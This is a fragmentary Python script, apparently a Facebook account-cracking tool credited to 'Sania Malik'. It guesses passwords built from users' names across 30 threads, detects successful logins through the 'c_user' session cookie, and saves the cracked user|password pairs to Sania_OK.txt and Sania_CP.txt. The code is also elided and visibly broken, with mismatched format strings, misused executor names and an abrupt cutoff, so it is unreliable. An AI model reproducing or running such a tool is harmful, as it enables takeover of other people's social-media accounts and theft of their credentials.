...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Sania Malik
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Sania Malik
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Sania007
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSania_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSania_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Sania Menu ")
	    sania()
...
def sania():
    ...
    print(' [E] exit ')
    print('')
    _sania___ = input(' [?] Choose option : ')
    if _sania___ in ('1', '01'):
        __xxx__().saniax(id)
    if _sania___ in ('2', '02'):
        create_file()
    if _sania___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Sania] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Sania-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Sania_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Sania-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Sania_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sania(max_workers=30) as ssbworld:
            ...
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with saniamalik(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
